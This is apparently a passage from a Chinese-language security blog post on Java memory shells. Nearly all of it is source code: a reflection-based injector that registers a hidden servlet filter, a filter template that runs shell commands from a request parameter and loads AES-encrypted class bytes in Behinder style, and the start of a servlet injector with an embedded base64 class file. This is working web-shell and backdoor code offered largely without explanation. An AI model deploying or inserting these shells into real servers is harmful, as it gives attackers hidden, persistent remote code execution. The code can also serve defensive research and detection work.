class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">HFilter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addFilterWithMapping&quot;</span>, Class.class, String.class, Integer.TYPE);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, HFilter, <span class="string">&quot;/*&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用addFilterWithMapping有个问题，动态添加FilterMapping时，其dispatches可能会与已加载到内存中的FilterMapping重复了，因此需要调整元素在_filterPathMappings中的位置</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterMaps</span> <span class="operator">=</span> GetField(servletHandler, <span class="string">&quot;_filterMappings&quot;</span>);</span><br><span class="line">            Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[Array.getLength(filterMaps)];</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; Array.getLength(filterMaps); ++j) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">filter</span> <span class="operator">=</span> Array.get(filterMaps, j);</span><br><span class="line">                <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> (String)GetField(filter, <span class="string">&quot;_filterName&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (filterName.contains(HFilter.getName())) &#123;</span><br><span class="line">                    tmpFilterMaps[<span class="number">0</span>] = filter;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tmpFilterMaps[n] = filter;</span><br><span class="line">                    ++n;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; tmpFilterMaps.length; ++j) &#123;</span><br><span class="line">                Array.set(filterMaps, j, tmpFilterMaps[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AddFilterShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadFilter();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectFilter();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AddFilterShell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只不过包名有点改变，然后有些类消失了，比如sun.misc.base64这个类<br>FilterTemplates</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTemplate</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Filter says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(servletRequest.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; servletRequest.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(Config.getPassword());</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                servletResponse.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(((HttpServletRequest)servletRequest).getHeader(Config.getHeader()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (((HttpServletRequest)servletRequest).getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> Config.getBehinderShellPwdPwd();</span><br><span class="line">                    ((HttpServletRequest)servletRequest).getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((((HttpServletRequest)servletRequest).getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(BASE64Decoder(servletRequest.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;servletRequest, servletResponse&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddServletShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;com.boogipop.memshell.ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = BASE64Decoder(<span class="string">&quot;yv66vgAAADIBFgoASAB2CQB3AHgIAHkKAHoAewgAfAsAfQB+CAB/CgANAIAKAIEAggoADQCDCQCEAIUIAIYHAIcIAIgIAIkIAFgIAIoHAIsKAIwAjQoAjACOCgCPAJAKABIAkQgAkgoAEgCTCgASAJQLAJUAlgoAlwB7CgCBAJgLAH0AmQsAfQCaCACbCgCBAJwLAH0AnQgAngsAnwCgCAChCgCiAKMHAKQHAKUKACcAdgsAnwCmCgAnAKcIAKgKACcAqQoAJwCqCgANAKsKACYArAoAogCtBwCuCgAxAHYLAH0ArwoAsACxCgAxALIKAKIAswcAtAoAQgC1CgA+ALYKADcAtwoANwC4CgA+ALkIALoHALsHALwHAL0KAD4AvgcAvwoAwADBBwDCCgBEAMMKAEcAxAcAxQcAxgEAAVUBAAxJbm5lckNsYXNzZXMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvU2VydmxldFRlbXBsYXRlczsBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAFrAQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAJbQgEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCHBwBVBwDCAQAKRXhjZXB0aW9ucwcAxwEABWRvR2V0AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAKU291cmNlRmlsZQEAFVNlcnZsZXRUZW1wbGF0ZXMuamF2YQwASwBMBwDIDADJAMoBAB5bK10gRHluYW1pYyBTZXJ2bGV0IHNheXMgaGVsbG8HAMsMAMwAzQEABHR5cGUHAM4MAM8A0AEABWJhc2ljDAC6ANEHANIMANMA1AwA1QDWBwDXDADYAFcBAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHANkMANoA2wwA3ADdBwDeDADfAOAMAEsA4QEAAlxBDADiAOMMAOQA1AcA5QwA5gDnBwDoDADpANQMAOkA0AwA6gDUAQAEUE9TVAwA6wDUDADsAO0BAAF1BwDuDADvAPABAANBRVMHAPEMAPIA8wEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA9AD1DAD2APcBAAAMAPYA+AwA+QDUDAD6APsMAEsA/AwA/QD+AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA/wEABwEBDAECANQMAQMBBAwBBQEGAQAoY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMkVQwBBwEIDAEJAQoMAEsBCwwBDAENDAEOAQ8BAAZlcXVhbHMBAA9qYXZhL2xhbmcvQ2xhc3MBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UMARABEQEAEGphdmEvbGFuZy9PYmplY3QHARIMARMBFAEAE2phdmEvbGFuZy9FeGNlcHRpb24MARUATAwAUgBTAQAmY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAcY29tL2Jvb2dpcG9wL21lbXNoZWxsL0NvbmZpZwEAC2dldFBhc3N3b3JkAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpc0VtcHR5AQADKClaAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBABZnZXRCZWhpbmRlclNoZWxsUHdkUHdkAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAEIoTGNvbS9ib29naXBvcC9tZW1zaGVsbC9TZXJ2bGV0VGVtcGxhdGVzO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQAhAEcASAAAAAAABAABAEsATAABAE0AAAAvAAEAAQAAAAUqtwABsQAAAAIATgAAAAYAAQAAAA8ATwAAAAwAAQAAAAUAUABRAAAABABSAFMAAgBNAAACkgAHAAkAAAFqsgACEgO2AAQrEgW5AAYCAMYAiysSBbkABgIAEge2AAiZAHsruAAJuQAGAgBOLcYAai22AAqaAGMBOgSyAAsSDLYACJkAGga9AA1ZAxIOU1kEEg9TWQUtUzoEpwAXBr0ADVkDEhBTWQQSEVNZBS1TOgS7ABJZuAATGQS2ABS2ABW3ABYSF7YAGLYAGToFLLkAGgEAGQW2ABunANEruAAcuQAdAgDGAMUruQAeAQASH7YACJkAr7gAIE4ruQAhAQASIi25ACMDABIkuAAlOgQZBAW7ACZZuwAnWbcAKCu5ACEBABIiuQApAgC2ACoSK7YALLYALbYALhIktwAvtgAwGQS7ADFZtwAyK7kAMwEAtgA0tgA1tgA2OgW7ADdZKiq2ADi2ADm3ADoZBbYAOzoGGQa2ADw6BxkGEj0FvQA+WQMSP1NZBBJAU7YAQToIGQgZBwW9AEJZAytTWQQsU7YAQ1enAAhOLbYARbEAAQCnAWEBZABEAAMATgAAAGYAGQAAAB